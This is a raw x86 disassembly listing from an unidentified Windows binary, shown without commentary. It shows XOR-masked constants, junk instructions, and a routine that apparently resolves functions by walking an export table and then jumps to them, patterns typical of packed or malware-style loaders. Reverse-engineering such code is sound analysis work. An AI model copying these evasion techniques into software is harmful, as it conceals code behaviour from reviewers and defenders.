  421941:	mov    ecx,DWORD PTR [ebp+0x8]
  421944:	lea    eax,[ecx+eax*1-0x1f534807]
  42194b:	mov    ecx,DWORD PTR [ebp-0xf0]
  421951:	and    ecx,0x4108
  421957:	and    ecx,0x40e7
  42195d:	sub    ecx,0x1a54
  421963:	xor    ecx,0x25ac
  421969:	mov    edx,DWORD PTR [ebp-0x104]
  42196f:	xor    edx,0x6dda
  421975:	mov    esi,DWORD PTR [ebp-0x108]
  42197b:	and    edx,esi
  42197d:	and    edx,0xe0c
  421983:	or     edx,0x5b
  421986:	mov    esi,DWORD PTR [ebp-0xe8]
  42198c:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  421990:	add    ecx,eax
  421992:	lea    eax,[edx+ecx*1-0xc5b]
  421999:	mov    DWORD PTR [ebp-0xa8],eax
  42199f:	and    DWORD PTR [ebp-0x144],0x0
  4219a6:	jmp    0x4219b8
  4219ab:	mov    eax,DWORD PTR [ebp-0x144]
  4219b1:	inc    eax
  4219b2:	mov    DWORD PTR [ebp-0x144],eax
  4219b8:	mov    eax,DWORD PTR [ebp-0xe8]
  4219be:	mov    ecx,DWORD PTR [ebp-0x144]
  4219c4:	cmp    ecx,DWORD PTR [eax+0x18]
  4219c7:	je     0x421f80
  4219cd:	mov    eax,DWORD PTR [ebp-0x144]
  4219d3:	mov    ecx,DWORD PTR [ebp-0x38]
  4219d6:	mov    edx,DWORD PTR [ebp+0x8]
  4219d9:	add    edx,DWORD PTR [ecx+eax*4]
  4219dc:	mov    DWORD PTR [ebp-0x48],edx
  4219df:	mov    eax,DWORD PTR [ebp-0x48]
  4219e2:	mov    DWORD PTR [ebp-0x210],eax
  4219e8:	mov    eax,DWORD PTR [ebp+0xc]
  4219eb:	mov    DWORD PTR [ebp-0x20c],eax
  4219f1:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  4219fb:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a05:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a0f:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a19:	lea    eax,[ebp-0x1e8]
  421a1f:	mov    DWORD PTR [ebp-0x1f4],eax
  421a25:	mov    eax,DWORD PTR [ebp-0x20c]
  421a2b:	movzx  eax,WORD PTR [eax+0x20]
  421a2f:	xor    eax,0xa49b
  421a34:	movzx  eax,ax
  421a37:	sar    eax,1
  421a39:	mov    ecx,DWORD PTR [ebp-0x20c]
  421a3f:	movzx  ecx,WORD PTR [ecx+0x20]
  421a43:	xor    ecx,0xa49b
  421a49:	movzx  ecx,cx
  421a4c:	shl    ecx,0xf
  421a4f:	or     eax,ecx
  421a51:	movzx  eax,ax
  421a54:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421a5a:	mov    DWORD PTR [ecx],eax
  421a5c:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a62:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a68:	xor    eax,0xca79a575
  421a6d:	xor    edx,0x9c1b89e8
  421a73:	mov    cl,0x2
  421a75:	call   0x40a9b5
  421a7a:	mov    ebx,eax
  421a7c:	mov    esi,edx
  421a7e:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a84:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a8a:	xor    eax,0xca79a575
  421a8f:	xor    edx,0x9c1b89e8
  421a95:	mov    cl,0x3e
  421a97:	call   0x422214
  421a9c:	or     ebx,eax
  421a9e:	or     esi,edx
  421aa0:	movzx  eax,bl
  421aa3:	push   eax
  421aa4:	lea    eax,[ebp-0x198]
  421aaa:	push   eax
  421aab:	call   0x416c9e
  421ab0:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ab6:	mov    edx,DWORD PTR [ebp-0x1ec]
  421abc:	xor    eax,0xca79a575
  421ac1:	xor    edx,0x9c1b89e8
  421ac7:	mov    cl,0x2
  421ac9:	call   0x40a9b5
  421ace:	mov    esi,eax
  421ad0:	mov    edi,edx
  421ad2:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ad8:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ade:	xor    eax,0xca79a575
  421ae3:	xor    edx,0x9c1b89e8
  421ae9:	mov    cl,0x3e
  421aeb:	call   0x422214
  421af0:	or     esi,eax
  421af2:	or     edi,edx
  421af4:	mov    DWORD PTR [ebp-0x1f8],esi
  421afa:	jmp    0x421b4f
  421aff:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b05:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b0b:	xor    eax,0xca79a575
  421b10:	xor    edx,0x9c1b89e8
  421b16:	mov    cl,0x2
  421b18:	call   0x40a9b5
  421b1d:	mov    esi,eax
  421b1f:	mov    edi,edx
  421b21:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b27:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b2d:	xor    eax,0xca79a575
  421b32:	xor    edx,0x9c1b89e8
  421b38:	mov    cl,0x3e
  421b3a:	call   0x422214
  421b3f:	or     esi,eax
  421b41:	or     edi,edx
  421b43:	add    esi,DWORD PTR [ebp-0x1f8]
  421b49:	mov    DWORD PTR [ebp-0x1f8],esi
  421b4f:	mov    eax,DWORD PTR [ebp-0x1e8]
  421b55:	cmp    DWORD PTR [ebp-0x1f8],eax
  421b5b:	je     0x421bee
  421b61:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b67:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b6d:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421b72:	xor    eax,0xa49b
  421b77:	movzx  eax,ax
  421b7a:	sar    eax,1
  421b7c:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421b82:	mov    edx,DWORD PTR [ebp-0x20c]
  421b88:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421b8d:	xor    ecx,0xa49b
  421b93:	movzx  ecx,cx
  421b96:	shl    ecx,0xf
  421b99:	or     eax,ecx
  421b9b:	movzx  eax,ax
  421b9e:	mov    DWORD PTR [ebp-0x1fc],eax
  421ba4:	mov    eax,DWORD PTR [ebp-0x1f8]
  421baa:	mov    ecx,DWORD PTR [ebp-0x20c]
  421bb0:	movzx  eax,WORD PTR [ecx+eax*4]
  421bb4:	xor    eax,0xa49b
  421bb9:	movzx  eax,ax
  421bbc:	sar    eax,1
  421bbe:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bc4:	mov    edx,DWORD PTR [ebp-0x20c]
  421bca:	movzx  ecx,WORD PTR [edx+ecx*4]
  421bce:	xor    ecx,0xa49b
  421bd4:	movzx  ecx,cx
  421bd7:	shl    ecx,0xf
  421bda:	or     eax,ecx
  421bdc:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421be2:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421be9:	jmp    0x421aff
  421bee:	mov    eax,DWORD PTR [ebp-0x1f0]
  421bf4:	mov    edx,DWORD PTR [ebp-0x1ec]
  421bfa:	xor    eax,0xca79a575
  421bff:	xor    edx,0x9c1b89e8
  421c05:	mov    cl,0x2
  421c07:	call   0x40a9b5
  421c0c:	mov    esi,eax
  421c0e:	mov    edi,edx
  421c10:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c16:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c1c:	xor    eax,0xca79a575
  421c21:	xor    edx,0x9c1b89e8
  421c27:	mov    cl,0x3e
  421c29:	call   0x422214
  421c2e:	or     esi,eax
  421c30:	or     edi,edx
  421c32:	mov    DWORD PTR [ebp-0x1e4],esi
  421c38:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c3e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c44:	xor    eax,0xca79a575
  421c49:	xor    edx,0x9c1b89e8
  421c4f:	mov    cl,0x2
  421c51:	call   0x40a9b5
  421c56:	mov    esi,eax
  421c58:	mov    edi,edx
  421c5a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c60:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c66:	xor    eax,0xca79a575
  421c6b:	xor    edx,0x9c1b89e8
  421c71:	mov    cl,0x3e
  421c73:	call   0x422214
  421c78:	or     esi,eax
  421c7a:	or     edi,edx
  421c7c:	mov    DWORD PTR [ebp-0x23c],esi
  421c82:	mov    DWORD PTR [ebp-0x238],edi
  421c88:	mov    eax,DWORD PTR [ebp-0x23c]
  421c8e:	or     eax,DWORD PTR [ebp-0x238]
  421c94:	je     0x421ef4
  421c9a:	lea    eax,[ebp-0x204]
  421ca0:	mov    DWORD PTR [ebp-0x208],eax
  421ca6:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cac:	xor    edx,edx
  421cae:	mov    cl,0x2
  421cb0:	call   0x422214
  421cb5:	mov    esi,eax
  421cb7:	mov    edi,edx
  421cb9:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cbf:	xor    edx,edx
  421cc1:	mov    cl,0x3e
  421cc3:	call   0x40a9b5
  421cc8:	or     esi,eax
  421cca:	or     edi,edx
  421ccc:	xor    esi,0xca79a575
  421cd2:	xor    edi,0x9c1b89e8
  421cd8:	mov    eax,DWORD PTR [ebp-0x208]
  421cde:	mov    DWORD PTR [eax],esi
  421ce0:	mov    DWORD PTR [eax+0x4],edi
  421ce3:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ce9:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421cf1:	mov    eax,DWORD PTR [ebp-0x1e0]
  421cf7:	mov    edx,DWORD PTR [ebp-0x1dc]
  421cfd:	xor    eax,0xca79a575
  421d02:	xor    edx,0x9c1b89e8
  421d08:	mov    cl,0x2
  421d0a:	call   0x40a9b5
  421d0f:	mov    ebx,eax
  421d11:	mov    edi,edx
  421d13:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d19:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d1f:	xor    eax,0xca79a575
  421d24:	xor    edx,0x9c1b89e8
  421d2a:	mov    cl,0x3e
  421d2c:	call   0x422214
  421d31:	or     ebx,eax
  421d33:	or     edi,edx
  421d35:	movsx  eax,bl
  421d38:	cmp    esi,eax
  421d3a:	je     0x421e9a
  421d40:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d46:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d4e:	mov    eax,DWORD PTR [ebp-0x204]
  421d54:	mov    edx,DWORD PTR [ebp-0x200]
  421d5a:	xor    eax,0xca79a575
  421d5f:	xor    edx,0x9c1b89e8
  421d65:	mov    cl,0x2
  421d67:	call   0x40a9b5
  421d6c:	mov    edi,eax
  421d6e:	mov    ebx,edx
  421d70:	mov    eax,DWORD PTR [ebp-0x204]
  421d76:	mov    edx,DWORD PTR [ebp-0x200]
  421d7c:	xor    eax,0xca79a575
  421d81:	xor    edx,0x9c1b89e8
  421d87:	mov    cl,0x3e
  421d89:	call   0x422214
  421d8e:	or     edi,eax
  421d90:	or     ebx,edx
  421d92:	mov    eax,DWORD PTR [ebp-0x210]
  421d98:	movsx  eax,BYTE PTR [eax+edi*1]
  421d9c:	cmp    esi,eax
  421d9e:	je     0x421dae
  421da4:	jmp    0x421ef4
  421da9:	jmp    0x421e9a
  421dae:	mov    eax,DWORD PTR [ebp-0x204]
  421db4:	mov    edx,DWORD PTR [ebp-0x200]
  421dba:	xor    eax,0xca79a575
  421dbf:	xor    edx,0x9c1b89e8
  421dc5:	mov    cl,0x2
  421dc7:	call   0x40a9b5
  421dcc:	mov    esi,eax
  421dce:	mov    edi,edx
  421dd0:	mov    eax,DWORD PTR [ebp-0x204]
  421dd6:	mov    edx,DWORD PTR [ebp-0x200]
  421ddc:	xor    eax,0xca79a575
  421de1:	xor    edx,0x9c1b89e8
  421de7:	mov    cl,0x3e
  421de9:	call   0x422214
  421dee:	or     esi,eax
  421df0:	or     edi,edx
  421df2:	mov    eax,DWORD PTR [ebp-0x210]
  421df8:	movsx  esi,BYTE PTR [eax+esi*1]
  421dfc:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e02:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e08:	xor    eax,0xca79a575
  421e0d:	xor    edx,0x9c1b89e8
  421e13:	mov    cl,0x2
  421e15:	call   0x40a9b5
  421e1a:	mov    ebx,eax
  421e1c:	mov    edi,edx
  421e1e:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e24:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e2a:	xor    eax,0xca79a575
  421e2f:	xor    edx,0x9c1b89e8
  421e35:	mov    cl,0x3e
  421e37:	call   0x422214
  421e3c:	or     ebx,eax
  421e3e:	or     edi,edx
  421e40:	movsx  eax,bl
  421e43:	cmp    esi,eax
  421e45:	jne    0x421e9a
  421e4b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e51:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e57:	xor    eax,0xca79a575
  421e5c:	xor    edx,0x9c1b89e8
  421e62:	mov    cl,0x2
  421e64:	call   0x40a9b5
  421e69:	mov    esi,eax
  421e6b:	mov    edi,edx
  421e6d:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e73:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e79:	xor    eax,0xca79a575
  421e7e:	xor    edx,0x9c1b89e8
  421e84:	mov    cl,0x3e
  421e86:	call   0x422214
  421e8b:	or     esi,eax
  421e8d:	or     edi,edx
  421e8f:	mov    DWORD PTR [ebp-0x214],esi
  421e95:	jmp    0x421f3e
  421e9a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ea0:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ea6:	xor    eax,0xca79a575
  421eab:	xor    edx,0x9c1b89e8
  421eb1:	mov    cl,0x2
  421eb3:	call   0x40a9b5
  421eb8:	mov    esi,eax
  421eba:	mov    edi,edx
  421ebc:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ec2:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ec8:	xor    eax,0xca79a575
  421ecd:	xor    edx,0x9c1b89e8
  421ed3:	mov    cl,0x3e
  421ed5:	call   0x422214
  421eda:	or     esi,eax
  421edc:	or     edi,edx
  421ede:	add    esi,DWORD PTR [ebp-0x1e4]
  421ee4:	mov    DWORD PTR [ebp-0x1e4],esi
  421eea:	jmp    0x421c38
  421eef:	jmp    0x421c38
  421ef4:	mov    eax,DWORD PTR [ebp-0x1f0]
  421efa:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f00:	xor    eax,0xca79a575
  421f05:	xor    edx,0x9c1b89e8
  421f0b:	mov    cl,0x2
  421f0d:	call   0x40a9b5
  421f12:	mov    esi,eax
  421f14:	mov    edi,edx
  421f16:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f1c:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f22:	xor    eax,0xca79a575
  421f27:	xor    edx,0x9c1b89e8
  421f2d:	mov    cl,0x3e
  421f2f:	call   0x422214
  421f34:	or     esi,eax
  421f36:	or     edi,edx
  421f38:	mov    DWORD PTR [ebp-0x214],esi
  421f3e:	mov    eax,DWORD PTR [ebp-0x214]
  421f44:	mov    DWORD PTR [ebp-0xc8],eax
  421f4a:	cmp    DWORD PTR [ebp-0xc8],0x0
  421f51:	je     0x421f7b
  421f57:	mov    eax,DWORD PTR [ebp-0x144]
  421f5d:	mov    ecx,DWORD PTR [ebp-0xac]
  421f63:	movzx  eax,WORD PTR [ecx+eax*2]
  421f67:	mov    ecx,DWORD PTR [ebp-0xa8]
  421f6d:	mov    eax,DWORD PTR [ecx+eax*4]
  421f70:	mov    DWORD PTR [ebp-0xfc],eax
  421f76:	jmp    0x421f80
  421f7b:	jmp    0x4219ab
  421f80:	cmp    DWORD PTR [ebp-0xfc],0x0
  421f87:	jne    0x421f94
  421f8d:	xor    eax,eax
  421f8f:	jmp    0x42220d
  421f94:	mov    eax,DWORD PTR [ebp+0x8]
  421f97:	add    eax,DWORD PTR [ebp-0xfc]
  421f9d:	mov    DWORD PTR [ebp-0xec],eax
  421fa3:	mov    DWORD PTR [ebp-0x74],0x0
  421faa:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fb1:	je     0x42202d
  421fb7:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fbe:	je     0x42202d
  421fc4:	mov    eax,DWORD PTR [ebp-0xb0]
  421fca:	shl    eax,0x2
  421fcd:	mov    DWORD PTR [ebp-0x74],eax
  421fd0:	mov    DWORD PTR [ebp-0x14c],0x0
  421fda:	sub    esp,DWORD PTR [ebp-0x74]
  421fdd:	mov    DWORD PTR [ebp-0x14c],esp
  421fe3:	mov    DWORD PTR [ebp-0x148],0x0
  421fed:	mov    eax,DWORD PTR [ebp-0x148]
  421ff3:	cmp    eax,DWORD PTR [ebp-0xb0]
  421ff9:	je     0x42202d
  421fff:	mov    eax,DWORD PTR [ebp-0x148]
  422005:	mov    ecx,DWORD PTR [ebp-0x14c]
  42200b:	mov    edx,DWORD PTR [ebp-0x148]
  422011:	mov    esi,DWORD PTR [ebp+0x14]
  422014:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422018:	mov    DWORD PTR [ecx+eax*4],edx
  42201b:	mov    eax,DWORD PTR [ebp-0x148]
  422021:	inc    eax
  422022:	mov    DWORD PTR [ebp-0x148],eax
  422028:	jmp    0x421fed
  42202d:	mov    DWORD PTR [ebp-0x9c],0x0
  422037:	push   0x4221c6
  42203c:	jmp    DWORD PTR [ebp-0xec]
  422042:	mov    eax,eax
  422044:	mov    ecx,esp
  422046:	ret    0xc
  422049:	cmp    DWORD PTR ds:0x4282df,0x0
  422050:	mov    DWORD PTR ds:0x4282db,0x7476
  42205a:	mov    DWORD PTR ds:0x428157,0x1cdc
  422064:	mov    DWORD PTR ds:0x4282db,0x65fa
  42206e:	mov    DWORD PTR ds:0x428147,0x5dca
  422078:	jmp    0x4220c2
  42207d:	mov    eax,ds:0x4282d7
  422082:	cmp    DWORD PTR ds:0x4282df,0x0
  422089:	jbe    0x4220aa
  42208f:	push   0x24f1
  422094:	call   DWORD PTR ds:0x428d58
  42209a:	inc    DWORD PTR ds:0x428383
  4220a0:	sub    DWORD PTR ds:0x428163,0x46d9
  4220aa:	inc    DWORD PTR ds:0x4282df
  4220b0:	adc    DWORD PTR ds:0x4282eb,ebx
  4220b6:	or     DWORD PTR ds:0x428213,0x4029
  4220c0:	not    eax
  4220c2:	push   ebx
  4220c3:	push   esi
  4220c4:	sbb    DWORD PTR ds:0x42836f,edx
  4220ca:	mov    eax,DWORD PTR [esp+0x18]
  4220ce:	or     eax,eax
  4220d0:	jne    0x422100
  4220d6:	mov    ecx,DWORD PTR [esp+0x14]
  4220da:	mov    eax,DWORD PTR [esp+0x10]
  4220de:	xor    edx,edx
  4220e0:	div    ecx
  4220e2:	xor    DWORD PTR ds:0x42816f,0x45f1
  4220ec:	mov    ebx,eax
  4220ee:	mov    eax,DWORD PTR [esp+0xc]
  4220f2:	div    ecx
  4220f4:	mov    edx,0x36e3
  4220f9:	mov    edx,ebx
  4220fb:	jmp    0x4221c1
  422100:	mov    ecx,eax
  422102:	sbb    eax,0x67a9
  422107:	mov    ebx,DWORD PTR [esp+0x14]
  42210b:	cmp    DWORD PTR ds:0x4282d7,0x0
  422112:	mov    edx,DWORD PTR ds:0x428387
  422118:	mov    DWORD PTR ds:0x428307,0x4bc7
  422122:	mov    edx,DWORD PTR ds:0x4282ef
  422128:	jmp    0x422172
  42212d:	mov    DWORD PTR ds:0x428237,0x15f
  422137:	mov    DWORD PTR ds:0x42826f,0x4dd1
  422141:	cmp    DWORD PTR ds:0x4282d7,0x0
  422148:	jle    0x422165
  42214e:	push   0x824e
  422153:	call   DWORD PTR ds:0x428d5c
  422159:	xor    DWORD PTR ds:0x4282ef,0x6c44
  422163:	sub    edx,edx
  422165:	sbb    DWORD PTR ds:0x428237,0x445e
  42216f:	dec    edx
  422170:	not    edx
  422172:	mov    edx,DWORD PTR [esp+0x10]
  422176:	mov    eax,DWORD PTR [esp+0xc]
  42217a:	shr    ecx,1
  42217c:	rcr    ebx,1
  42217e:	shr    edx,1
  422180:	rcr    eax,1
  422182:	or     ecx,ecx
  422184:	jne    0x42217a
  42218a:	div    ebx
  42218c:	mov    esi,eax
  42218e:	mul    DWORD PTR [esp+0x18]
  422192:	mov    ecx,eax
  422194:	mov    eax,DWORD PTR [esp+0x14]
  422198:	mul    esi
  42219a:	add    edx,ecx
  42219c:	jb     0x4221bc
  4221a2:	cmp    edx,DWORD PTR [esp+0x10]
  4221a6:	ja     0x4221bc
  4221ac:	jb     0x4221bd
  4221b2:	cmp    eax,DWORD PTR [esp+0xc]
  4221b6:	jbe    0x4221bd
  4221bc:	dec    esi
  4221bd:	xor    edx,edx
  4221bf:	mov    eax,esi
  4221c1:	pop    esi
  4221c2:	pop    ebx
  4221c3:	ret    0x10
  4221c6:	or     DWORD PTR ds:0x428353,0x42835f
  4221d0:	sub    DWORD PTR [ebp+0x10],0x1
  4221d4:	mov    DWORD PTR ds:0x42815b,0x43bf
  4221de:	cmp    DWORD PTR [ebp+0x10],0x0
  4221e2:	mov    DWORD PTR ds:0x42834b,0x612a
  4221ec:	je     0x4221fb
  4221f2:	xor    DWORD PTR ds:0x428147,edx
  4221f8:	add    esp,DWORD PTR [ebp-0x74]
  4221fb:	mov    DWORD PTR [ebp-0x9c],eax
  422201:	mov    DWORD PTR ds:0x42824f,ebx
  422207:	mov    eax,DWORD PTR [ebp-0x9c]
  42220d:	pop    edi
  42220e:	pop    esi
  42220f:	pop    ebx
  422210:	leave  
  422211:	ret    0x10
  422214:	cmp    cl,0x40
  422217:	mov    DWORD PTR ds:0x428233,0x43a8
  422221:	jae    0x422273
  422227:	mov    DWORD PTR ds:0x428167,0x42f2
  422231:	cmp    cl,0x20
  422234:	mov    DWORD PTR ds:0x42814f,0x3d58
  42223e:	jae    0x42225e
  422244:	or     DWORD PTR ds:0x428143,0x5e1e
  42224e:	shld   edx,eax,cl
  422251:	mov    DWORD PTR ds:0x428267,0x1bd2
  42225b:	shl    eax,cl
  42225d:	ret    
  42225e:	inc    edx
  42225f:	mov    edx,eax
  422261:	sub    DWORD PTR ds:0x428383,0x4282db
  42226b:	xor    eax,eax
  42226d:	and    cl,0x1f
  422270:	shl    edx,cl
  422272:	ret    
  422273:	xor    eax,eax
  422275:	xor    edx,edx
  422277:	ret    
	...
  422280:	jmp    0x3c568dc0
  422285:	es sub al,0x44
  422288:	jno    0x4222f3
  42228a:	ja     0x4222f1
  42228c:	int3   
  42228d:	fsubr  QWORD PTR [edx+0x1e]
  422290:	jo     0x4222f7
  422292:	popa   
  422293:	ins    BYTE PTR es:[edi],dx
  422294:	push   eax
  422295:	lods   eax,DWORD PTR ds:[esi]
  422296:	xor    DWORD PTR [esi+0x41],edi
  422299:	ins    BYTE PTR es:[edi],dx
  42229a:	popa   
  42229b:	outs   dx,BYTE PTR ds:[esi]
  42229c:	add    BYTE PTR [eax],al
  42229e:	add    BYTE PTR [eax],al
  4222a0:	addr16 jb 0x422308
  4222a3:	popa   
  4222a4:	je     0x42230d
  4222a6:	jb     0x42230d
  4222a8:	popa   
  4222a9:	je     0x422312
  4222ab:	jb     0x422312
  4222ad:	popa   
  4222ae:	je     0x422317
  4222b0:	jb     0x422317
  4222b2:	popa   
  4222b3:	je     0x42231c
  4222b5:	jb     0x42231c
  4222b7:	popa   
  4222b8:	je     0x422321
  4222ba:	jb     0x422321
  4222bc:	popa   
  4222bd:	je     0x422326
  4222bf:	jb     0x422326
  4222c1:	popa   
  4222c2:	je     0x42232b
  4222c4:	jb     0x42232b
  4222c6:	popa   
  4222c7:	je     0x422330
  4222c9:	jb     0x422330
  4222cb:	popa   
  4222cc:	je     0x422335
  4222ce:	jb     0x422335
  4222d0:	popa   
  4222d1:	je     0x4222d3
  4222d3:	add    BYTE PTR [eax+0x65],ch
  4222d6:	ins    BYTE PTR es:[edi],dx
  4222d7:	ins    BYTE PTR es:[edi],dx
  4222d8:	push   0x686c6c65
  4222dd:	gs ins BYTE PTR es:[edi],dx
  4222df:	ins    BYTE PTR es:[edi],dx
  4222e0:	push   0x686c6c65
  4222e5:	gs ins BYTE PTR es:[edi],dx
  4222e7:	ins    BYTE PTR es:[edi],dx
  4222e8:	push   0x686c6c65
  4222ed:	gs ins BYTE PTR es:[edi],dx
  4222ef:	ins    BYTE PTR es:[edi],dx
  4222f0:	push   0x686c6c65
  4222f5:	gs ins BYTE PTR es:[edi],dx
  4222f7:	ins    BYTE PTR es:[edi],dx
  4222f8:	push   0x686c6c65
  4222fd:	gs ins BYTE PTR es:[edi],dx
  4222ff:	ins    BYTE PTR es:[edi],dx
  422300:	push   0x686c6c65
  422305:	gs ins BYTE PTR es:[edi],dx
  422307:	ins    BYTE PTR es:[edi],dx
  422308:	add    BYTE PTR [eax],al
  42230a:	add    BYTE PTR [eax],al
  42230c:	outs   dx,DWORD PTR ds:[esi]
  42230d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422311:	add    BYTE PTR [ecx+0x0],ah
  422314:	jne    0x422316
  422316:	je     0x422318
  422318:	xor    eax,DWORD PTR [eax]
  42231a:	xor    al,BYTE PTR [eax]
  42231c:	add    BYTE PTR [eax],al
  42231e:	add    BYTE PTR [eax],al
  422320:	push   0x61006500
  422325:	add    BYTE PTR [esi+0x0],dh
  422328:	add    BYTE PTR gs:[esi+0x0],ch
  42232c:	push   0x61006500
  422331:	add    BYTE PTR [esi+0x0],dh
  422334:	add    BYTE PTR gs:[esi+0x0],ch
  422338:	push   0x61006500
  42233d:	add    BYTE PTR [esi+0x0],dh
  422340:	add    BYTE PTR gs:[esi+0x0],ch
  422344:	push   0x61006500
  422349:	add    BYTE PTR [esi+0x0],dh
  42234c:	add    BYTE PTR gs:[esi+0x0],ch
  422350:	push   0x61006500
  422355:	add    BYTE PTR [esi+0x0],dh
  422358:	add    BYTE PTR gs:[esi+0x0],ch
  42235c:	push   0x61006500
  422361:	add    BYTE PTR [esi+0x0],dh
  422364:	add    BYTE PTR gs:[esi+0x0],ch
  422368:	push   0x61006500
  42236d:	add    BYTE PTR [esi+0x0],dh
  422370:	add    BYTE PTR gs:[esi+0x0],ch
  422374:	push   0x61006500
  422379:	add    BYTE PTR [esi+0x0],dh
  42237c:	add    BYTE PTR gs:[esi+0x0],ch
  422380:	push   0x61006500
  422385:	add    BYTE PTR [esi+0x0],dh
  422388:	add    BYTE PTR gs:[esi+0x0],ch
  42238c:	add    BYTE PTR [eax],al
  42238e:	add    BYTE PTR [eax],al
  422390:	or     al,0x23
  422392:	inc    edx
  422393:	add    BYTE PTR [edi+0x6c],cl
  422396:	gs dec ecx
  422398:	arpl   WORD PTR [edi+0x6e],bp
  42239b:	push   esp
  42239c:	outs   dx,DWORD PTR ds:[esi]
  42239d:	inc    ebx
  42239e:	jne    0x422412
  4223a0:	jae    0x422411
  4223a2:	jb     0x4223a4
  4223a4:	xchg   esp,eax
  4223a5:	and    eax,DWORD PTR [edx+0x0]
	...
  4223b0:	push   eax
  4223b1:	daa    
  4223b2:	inc    edx
  4223b3:	add    BYTE PTR [eax+0x27],bl
  4223b6:	inc    edx
  4223b7:	add    BYTE PTR [eax],dl
  4223b9:	es inc edx
  4223bb:	add    dl,dh
  4223bd:	inc    ebx
  4223be:	push   ebx
  4223bf:	mov    WORD PTR ds:0x1a49ba4,ss
  4223c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223c6:	popf   
  4223c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223c8:	jno    0x42236e
  4223ca:	xchg   edi,eax
  4223cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223cc:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d4:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  4223db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223dc:	rol    DWORD PTR [edx-0x5b6a732f],cl
  4223e2:	adc    eax,0x1a49ba4
  4223e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223e8:	popf   
  4223e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ea:	jno    0x422390
  4223ec:	xchg   edi,eax
  4223ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223ee:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  4223f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f6:	xor    eax,0x9ba485a4
  4223fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fc:	mov    ebx,0xd1e2d3a4
  422401:	in     al,dx
  422402:	xchg   ebp,eax
  422403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422404:	adc    eax,0x3ba49ba4
  422409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240a:	popf   
  42240b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422414:	fwait
  422415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422416:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42241d:	sub    al,0xf7
  42241f:	cs pop ss
  422421:	push   cs
  422422:	adc    eax,0x3a49108
  422427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422428:	fwait
  422429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242a:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
